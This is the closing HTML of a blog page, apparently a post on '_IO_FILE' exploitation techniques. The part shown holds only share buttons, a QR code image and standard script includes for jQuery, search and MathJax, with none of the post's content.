        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/07/09/io-file-利用方法/&title=《_IO_FILE 利用方法》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACI0lEQVR42u3aQZKDMAwFUe5/aXIAypP+EkwFub1KEWJ4XiiWrOPA47yM1T21+6+/Op4YMmTIeC3j/HOkr3X9FbmHP3f5DjJkyNiAQQIoCZckBHeeu7wuQ4YMGSD48iu1zzJkyJDxRMDli/LT/xsyZMj4GQZJJjsJbfrtg7m4DBkyXsjgVff///zI+YYMGTJexTjD0eGlG8fgrWTIkDGawQMcn67GTpstZMiQsRuDTJoeQPKEswZbzilDhoxxjLT039n21drO0HZThgwZ2zBqTRVpiypfjiBYy5AhYzQjLcSnqWxaXOPhPugZkSFDxssZaTsFb8KoYYpzypAhYxsGTyY5u5MSB0cLMmTIGM2otTvwQ8dOoY1sHGXIkLEDozYpKn6FiSgP8cskVoYMGaMZ/bJ+urnkKSsqCMqQIWM0gxwDdJq3ULgMjzn5E2XIkDGDQTSd7SNPXGtFNxkyZOzMqJXV+Cumc34J3DJkyBjN6LRWpJtCnujWjihkyJCxM4OnuOhhpSYwFJRlyJCxDeOuYj1fjhogmEKGDBmDGGmJjSerHR5fbhkyZExlnOFI2ylIApweJ6DTURkyZAxi9INdrV2M7Ohu6xmRIUPGCEa61etsEPlCxAFXhgwZGzBqCWdaSiPBNK2qyZAhQ0aHVGunKC6cDBkyZLQDbnqFN3bIkCFjHwY/DOBJKW9vvSEBliFDxmhGmjryAtldL82PRWXIkDGO8QF+/dsZte08lwAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
<script type="text/javascript" color="255,0,0"opacity="0.3"count="70" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>

<!-- third-party -->
<script type="text/javascript">
;( function( $ ) {

	$( '.swipebox' ).swipebox({
		hideCloseButtonOnMobile: true
	});

} )( jQuery );
</script>






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>






    
</body>
</html>
